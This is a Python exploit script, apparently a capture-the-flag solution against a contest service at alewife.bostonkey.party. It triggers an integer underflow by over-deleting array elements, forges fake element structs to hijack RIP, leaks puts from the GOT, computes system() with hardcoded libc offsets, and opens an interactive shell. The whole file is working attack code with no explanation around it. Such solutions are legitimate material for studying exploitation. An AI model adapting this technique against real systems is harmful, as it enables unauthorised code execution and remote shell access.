#!/usr/bin/env python
#coding: UTF-8

import struct
import socket
import telnetlib

TARGET = ('alewife.bostonkey.party', 8888)

def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<I'):
    return struct.pack(fmt, d)

def u(d, fmt='<I'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<I'):
    return u(d, fmt)[0]

def readtil(delim):
    buf = b''
    while not e(delim) in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.sendall(e(b) + b'\n')

def sendnum(n):
    sendln(str(n))

def cmd(n):
    sendnum(n)
    readtil(': ')


def new_array():
    cmd(1)
    cmd(1)

def add_numbers(t, idx, numbers):
    cmd(t)
    cmd(2)
    cmd(idx)
    cmd(1)
    cmd(len(numbers))
    for number in numbers:
        cmd(number)

def del_elem(idx):
    cmd(1)
    cmd(2)
    cmd(idx)
    cmd(4)

def print_array(idx, dontrecv=False):
    cmd(1)
    cmd(4)
    sendnum(idx)
    if not dontrecv:
        return readtil(': ')

def clone_to_int_array(idx):
    cmd(1)
    cmd(5)
    cmd(idx)
    cmd(2)

def del_number(idx):
    cmd(2)
    cmd(2)
    cmd(idx)
    cmd(4)

puts_to_system = 0x46640 - 0x6fe30         # Ubuntu 14.04
#puts_to_system = 0x03f7e0 - 0x6a1e0       # Arch, libc-2.21.so

def pwn():
    global s
    s = socket.create_connection(TARGET)
    readtil(': ')

    # create 32 untyped arrays
    for i in range(32):
        new_array()

    # create new, empty integer array
    clone_to_int_array(0)

    # fill integer array with fake element structs
    rip1 = 0x40214e             # to_string()
    rdi  = 0x602db8             # target: got
    rip2 = 0x401e29             # end of current function
    add_numbers(2, 0, [0x4141414141414141]*2 + [rdi, rip1] + [0x43]*7 + [rip2])

    # completely fill last untyped array
    add_numbers(1, 31, [0x31337] * 0x100)

    # delete all plus one element from the last untyped array, integer underflow here
    for i in range(0x101):
        del_elem(31)

    # first RIP control: do the info leak and return safely
    resp = print_array(31)

    start, end = resp.find(b'"') + 1, resp.rfind(b'"')
    val = resp[start:end]
    puts = u1(val + b'\x00' * (8-len(val)), '<Q')
    system = puts + puts_to_system
    print("puts @ 0x{:x}".format(puts))
    print("system @ 0x{:x}".format(system))

    # clean up integer array for final stage
    for i in range(10):
        del_number(0)

    # create fake element struct
    add_numbers(2, 0, [u1(b'sh' + b'\x00'*6, '<Q'), system])

    # and get RIP control again, this time do a system('sh')
    print_array(31, dontrecv=True)      # function won't finish printing this time

    # verify that we got a shell
    s.send(b'echo pwned\n')
    assert(s.recv(1024) == b'pwned\n')
    print("pwned!")

    # enjoy
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

pwn()
